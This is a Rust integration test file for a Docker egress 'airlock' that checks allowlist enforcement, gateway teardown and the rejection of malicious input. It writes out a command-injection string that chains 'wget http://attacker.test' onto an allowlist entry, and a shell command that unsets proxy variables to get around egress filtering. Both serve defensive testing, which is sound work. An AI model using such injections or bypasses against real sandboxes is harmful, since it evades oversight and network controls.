//! `Airlock` lifecycle against a real Docker daemon (ADR-083).
//!
//! ADR-082 proved the topology by hand; this proves Ferric can stand it up
//! itself. Availability-gated like the rest, and every case carries at least one
//! assertion that cannot pass unless Docker genuinely worked — a silently
//! skipped run must never read as a validated one.

use ferric_research::airlock::Airlock;
use ferric_research::sandbox::{SandboxConfig, check_available, run_in_sandbox};

fn docker_ready(test: &str) -> bool {
    if check_available() {
        return true;
    }
    println!("SKIP {test}: no Docker daemon — airlock NOT validated by this run");
    false
}

fn sandboxed(lock: &Airlock, cmd: &[&str]) -> Result<String, String> {
    let config = SandboxConfig {
        network: lock.policy(),
        enforce_runsc: false,
        ..SandboxConfig::default()
    };
    run_in_sandbox(&config, cmd).map_err(|e| e.to_string())
}

/// The whole point, in one test so the (slow) gateway is built once: Ferric
/// creates the networks, runs the gateway, and the result enforces the
/// allowlist against a sandbox that cannot opt out.
#[test]
fn ferric_stands_up_an_enforcing_airlock() {
    if !docker_ready("ferric_stands_up_an_enforcing_airlock") {
        return;
    }

    let lock = match Airlock::start(&["example.com".to_string()]) {
        Ok(l) => l,
        Err(e) => {
            println!("SKIP: could not start the airlock ({e}) — NOT validated");
            return;
        }
    };
    assert!(
        lock.proxy_url().starts_with("http://"),
        "the gateway must have an address on the internal network: {}",
        lock.proxy_url()
    );

    // 1. Allowlisted host: reachable through the gateway. This is also the
    //    anti-skip guard — it cannot pass without real egress.
    let allowed = sandboxed(&lock, &["wget", "-qO-", "-T", "15", "http://example.com"]);

    // 2. Not on the allowlist: refused BY the gateway.
    let blocked = sandboxed(&lock, &["wget", "-qO-", "-T", "15", "http://neverssl.com"]);

    // 3. The bypass that defeated the old bridge-based policy.
    let bypass = sandboxed(
        &lock,
        &[
            "sh",
            "-c",
            "unset http_proxy https_proxy; wget -qO- -T 10 http://example.com",
        ],
    );

    assert!(
        allowed
            .as_deref()
            .unwrap_or_default()
            .contains("Example Domain"),
        "an allowlisted host must be reachable: {allowed:?}"
    );
    assert!(
        blocked.is_err(),
        "a blocked host must be refused: {blocked:?}"
    );
    assert!(
        bypass.is_err(),
        "unsetting the proxy env MUST NOT restore egress: {bypass:?}"
    );
}

/// Dropping the `Airlock` must remove the gateway — otherwise a panic mid-run
/// leaks the one container on the machine that has egress.
#[test]
fn dropping_the_airlock_removes_its_resources() {
    if !docker_ready("dropping_the_airlock_removes_its_resources") {
        return;
    }
    let Ok(lock) = Airlock::start(&["example.com".to_string()]) else {
        println!("SKIP: could not start the airlock — NOT validated");
        return;
    };

    // Assert on THIS airlock's gateway by name, not on the shared prefix:
    // airlocks are deliberately unique per instance, and a concurrently running
    // test has its own gateway. (A prefix match here failed under the default
    // parallel test threads while passing single-threaded — the assertion was
    // wrong, not the teardown.)
    let mine = lock.gateway_name().to_string();
    let exists = |name: &str| -> bool {
        std::process::Command::new("docker")
            .args(["ps", "-a", "--format", "{{.Names}}"])
            .output()
            .map(|o| {
                String::from_utf8_lossy(&o.stdout)
                    .lines()
                    .any(|l| l.trim() == name)
            })
            .unwrap_or(false)
    };

    // Confirm it exists first, so the post-drop assertion means something.
    assert!(exists(&mine), "expected {mine} while the airlock is alive");

    drop(lock);

    assert!(!exists(&mine), "dropping the airlock must remove {mine}");
}

/// An allowlist entry that would be shell-injected is refused before any docker
/// resource is created — a rejected allowlist must not leave debris.
#[test]
fn an_injecting_allowlist_creates_nothing() {
    let before = std::process::Command::new("docker")
        .args(["network", "ls", "--format", "{{.Name}}"])
        .output()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .matches("ferric-airlock-")
                .count()
        })
        .unwrap_or(0);

    assert!(Airlock::start(&["evil.test; wget http://attacker.test".to_string()]).is_err());

    let after = std::process::Command::new("docker")
        .args(["network", "ls", "--format", "{{.Name}}"])
        .output()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .matches("ferric-airlock-")
                .count()
        })
        .unwrap_or(0);
    assert_eq!(before, after, "a rejected allowlist must create nothing");
}
